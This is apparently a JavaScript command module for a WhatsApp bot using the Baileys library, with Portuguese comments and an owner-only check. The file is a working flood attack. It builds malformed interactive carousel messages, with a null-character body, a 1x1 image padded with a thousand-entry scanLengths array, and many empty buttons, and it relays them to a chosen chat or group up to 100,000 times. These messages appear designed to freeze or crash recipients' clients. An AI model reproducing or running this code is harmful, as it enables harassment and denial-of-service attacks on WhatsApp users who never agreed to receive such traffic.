const { createStatusQuoted } = require("../../functions/statusCard");
// commands/dono/flood-botoes.js
const config = require("../../config/config");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require("crypto");

module.exports = {
  name: "salmos91",
  aliases: ["floodbtn", "botoes", "flood"],
  description: "ᴇɴᴠɪᴀ ᴜᴍᴀ ғʟᴏᴏᴅ ᴅᴇ ᴍᴇɴsᴀɢᴇɴs ᴄᴏᴍ ʙᴏᴛᴏ̃ᴇs (ᴀᴘᴇɴᴀs ᴅᴏɴᴏ)",
  async execute(conn, msg, args, from, axiosInstance, cmdUsado) {
    try {
      const owner = config.ownerName || "ʟᴜᴋᴀᴍᴏᴅᴢᴢ";
      const bot = config.botName || "ʟᴜᴋᴀᴍᴏᴅᴢᴢ";
      const ownerLid = config.ownerLid || "";
      const prefix = config.prefix || ".";
      
      // 🔥 PEGA O NOME DO COMANDO USADO
      const texto = msg.message?.extendedTextMessage?.text || msg.message?.conversation || "";
      const cmd = texto.split(" ")[0].replace(prefix, "").trim() || module.exports.name;
      
      let pushName = "ᴜsᴜᴀ́ʀɪᴏ";
      try { pushName = msg.pushName || "ʟᴜᴋᴀᴍᴏᴅᴢᴢ"; } catch (e) { pushName = "ʟᴜᴋᴀᴍᴏᴅᴢᴢ"; }

      // 🔥 VERIFICA SE É O DONO
      const sender = msg.key.participant || msg.key.remoteJid || from;
      const isOwner = sender === ownerLid || sender.replace(/[^0-9]/g, "") === ownerLid.replace(/[^0-9]/g, "");

      if (!isOwner) {
        return await conn.sendMessage(from, { 
          text: "❌ ᴀᴘᴇɴᴀs ᴏ ᴅᴏɴᴏ ᴘᴏᴅᴇ ᴜsᴀʀ ᴇsᴛᴇ ᴄᴏᴍᴀɴᴅᴏ!",
          contextInfo: { 
            forwardingScore: 1, 
            isForwarded: true, 
            forwardedNewsletterMessageInfo: { 
              newsletterJid: "120363426698503859@newsletter", 
              newsletterName: `${bot}`, 
              serverMessageId: 116 
            } 
          }
        }, {
          quoted: createStatusQuoted(msg)
        });
      }

      // ==============================================
      // LÓGICA DO COMANDO
      // ==============================================

      const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

      // Parse dos argumentos
      let qtdBotoes = parseInt(args[0]) || 55;
      let targetJid = from;
      let messageText = '';
      let quantidadeEnvios = 1000;

      // Verifica se tem argumentos separados por |
      const argsStr = args.join(' ');
      const parts = argsStr.split('|').map(p => p.trim());

      if (parts.length >= 2 && parts[1].includes('@g.us')) {
        targetJid = parts[1];
        messageText = parts.slice(2).join('|').trim();
        if (parts[3]) {
          quantidadeEnvios = parseInt(parts[3]) || 100;
        }
      } else if (parts.length >= 2) {
        messageText = parts.slice(1).join('|').trim();
        if (parts[2]) {
          quantidadeEnvios = parseInt(parts[2]) || 100;
        }
      }

      // Limita valores
      if (qtdBotoes < 1) qtdBotoes = 1;
      if (quantidadeEnvios < 1) quantidadeEnvios = 1;
      if (quantidadeEnvios > 100000) quantidadeEnvios = 100000;

      const randomBytes = (len) => crypto.randomBytes(len);

      const padraoScan = [5838, 27756, 20270, 31109];
      const scanLengths = [];
      for (let i = 0; i < 250; i++) {
        scanLengths.push(...padraoScan);
      }

      const buttons = Array(qtdBotoes).fill({});

      const criarMensagem = () => {
        return {
          body: { text: '\u0000' },
          carouselMessage: {
            cards: [
              {
                header: {
                  imageMessage: {
                    url: 'https://mmg.whatsapp.net/v/t62.7118-24/697925809_1290301996041503_325987581680521496_n.enc?ccb=11-4&oh=01_Q5Aa4gFdxfQhfGfeeRgRlPOd_xYxiHUkjMhgMRYYS9m-SWKmog&oe=6A2738CF&_nc_sid=5e03e0&mms3=true',
                    mimetype: 'image/jpeg',
                    fileSha256: '4qd4tPZHXkjIlLvZJf0HY5XQYj72ZVxAI+5iKVgjLes=',
                    fileLength: '1',
                    height: 1,
                    width: 1,
                    mediaKey: 'fvQQovEmgPtY+MIimqnldyMLy7maiZzQux8DI/GExeE=',
                    fileEncSha256: 'xa0O0KPWqSNyAznp5iCxEnkpKHJ7iJZFTmKh3ooqanU=',
                    directPath: '/v/t62.7118-24/697925809_1290301996041503_325987581680521496_n.enc?ccb=11-4&oh=01_Q5Aa4gFdxfQhfGfeeRgRlPOd_xYxiHUkjMhgMRYYS9m-SWKmog&oe=6A2738CF&_nc_sid=5e03e0',
                    mediaKeyTimestamp: '1778374964',
                    jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAQIDBQEBAQEAAAAAAAAAAAAAAAAAAQAC/9oADAMBAAIQAxAAAADw4Jl0RlUrcRBN1jcYMz1vKxIGnUj/xAAjEAACAQMEAQUAAAAAAAAAAAAAAQIRMSIQEyFRIkEEEDJh/9oACAEAAAE/AK7JLA0q4qNb7Jl0kKUlgukXyJKPYpSRdIumSspkjJJZLkX7ZJRl0K04nEleK0rHo4klMTjTBWPRGN28Ykl6htTHwpSWGXTflmt+GpXwatPBD3Gm/qmf/8QAFBEBAAAAAAAAAAAAAAAAAAAAYP/aAAgBAgEBPwAv/8QAGREBAAIDAAAAAAAAAAAAAAAAAQAQESAh/9oADAEDAQE/ANWu0gmGf//',
                    scanLengths: scanLengths
                  },
                  hasMediaAttachment: true
                },
                nativeFlowMessage: {
                  buttons: buttons
                }
              }
            ],
            messageVersion: 1
          }
        };
      };

      const botJid = conn.user?.id || msg.key.participant || from;

      // Mensagem de início
      await conn.sendMessage(from, {
        text: `⏳ ғʟᴏᴏᴅᴀɴᴅᴏ ${quantidadeEnvios}x ᴄᴏᴍ ${qtdBotoes} ʙᴏᴛᴏ̃ᴇs...`,
        contextInfo: { forwardingScore: 1, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: "120363426698503859@newsletter", newsletterName: `${bot}`, serverMessageId: 116 } }
      }, { quoted: msg });

      let enviadas = 0;

      for (let envio = 0; envio < quantidadeEnvios; envio++) {
        try {
          const interactiveMessage = criarMensagem();

          const payload = {
            interactiveMessage: interactiveMessage,
            messageContextInfo: {
              messageSecret: randomBytes(32)
            }
          };

          const waMessage = generateWAMessageFromContent(targetJid, payload, { userJid: botJid });
          const msgId = waMessage.key.id;

          await conn.relayMessage(targetJid, waMessage.message, { messageId: msgId });

          enviadas++;
          console.log(`[BOTÕES] Envio ${enviadas}/${quantidadeEnvios} - ${qtdBotoes} botões`);

          await delay(100);

        } catch (err) {
          console.error(`[BOTÕES] Erro no envio ${envio + 1}:`, err.message);
          await delay(200);
        }
      }

      // Mensagem de conclusão
      await conn.sendMessage(from, {
        text: `✅ ғʟᴏᴏᴅ ᴄᴏɴᴄʟᴜɪ́ᴅᴏ! ${enviadas}/${quantidadeEnvios} ᴍᴇɴsᴀɢᴇɴs ᴅᴇ ${qtdBotoes} ʙᴏᴛᴏ̃ᴇs`,
        contextInfo: { forwardingScore: 1, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: "120363426698503859@newsletter", newsletterName: `${bot}`, serverMessageId: 116 } }
      }, { quoted: msg });

      // Envia mensagem extra se tiver texto
      if (messageText) {
        await conn.sendMessage(targetJid, { 
          text: messageText,
          contextInfo: { forwardingScore: 1, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: "120363426698503859@newsletter", newsletterName: `${bot}`, serverMessageId: 116 } }
        });
      }

    } catch (error) {
      console.error("❌ Erro flood-botoes:", error);
      await conn.sendMessage(from, { 
        text: `❌ *ᴇʀʀᴏ ᴀᴏ ᴇɴᴠɪᴀʀ ғʟᴏᴏᴅ!*\n\n📌 ${error.message}`,
        contextInfo: { 
          forwardingScore: 1, 
          isForwarded: true, 
          forwardedNewsletterMessageInfo: { 
            newsletterJid: "120363426698503859@newsletter", 
            newsletterName: `${bot}`, 
            serverMessageId: 116 
          } 
        }
      }, { quoted: msg });
    }
  }
};